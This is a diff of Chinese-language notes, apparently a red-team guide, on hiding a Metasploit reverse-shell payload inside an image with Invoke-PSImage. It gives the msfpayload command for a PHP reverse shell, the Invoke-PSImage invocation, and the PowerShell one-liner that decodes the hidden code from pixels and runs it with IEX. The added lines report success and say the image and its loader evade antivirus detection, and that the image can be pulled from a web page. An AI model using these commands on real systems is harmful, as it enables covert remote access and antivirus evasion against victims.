@@ -35,7 +35,7 @@ msfpayload php/reverse_php LHOST=x.x.x.x LPORT=2333 R > re.php
 
 set PAYLOAD php/reverse_php
 
-msf生成的payload执行可以反弹,但无法附加到生成的图片中执行
+先保证msf生成的payload执行可以反弹,再把它藏在图片中
 
 如果 powershell.ps1 不能被执行 ，修改权限：在powershell中执行 set-ExecutionPolicy RemoteSigned
 
@@ -46,11 +46,20 @@ msf生成的payload执行可以反弹,但无法附加到生成的图片中执行
 
 ```Invoke-PSImage -Script C:\Users\Administrator\Desktop\img5.ps1 -Image C:\Users\Administrator\Desktop\q.jpg -Out C:\Users\Administrator\Desktop\ss.png```
 
+![](2.jpg)
+
 回显
 
 ```
 sal a New-Object;Add-Type -AssemblyName "System.Drawing";$g=a System.Drawing.Bitmap("C:\Users\Administrator\Desktop\ss.png");$o=a Byte[] 2960;(0..4)|%{foreach($x in(0..591)){$p=$g.GetPixel($x,$_);$o[$_*592+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..2778]))
 ```
 
-在受控端powershell执行回显也会反弹，但没有复现成功
+在受控端powershell执行回显即可反弹，复现成功
+
+原理：将不免杀的payload藏于图片中，图片是免杀的，上传图片即可。调用图片的代码也是免杀的，类似于调用包含shellcode的文件
+
+生成的回显即为调图片的代码。也可以根据需求设置调用网页上的图片。
+
+
+
 
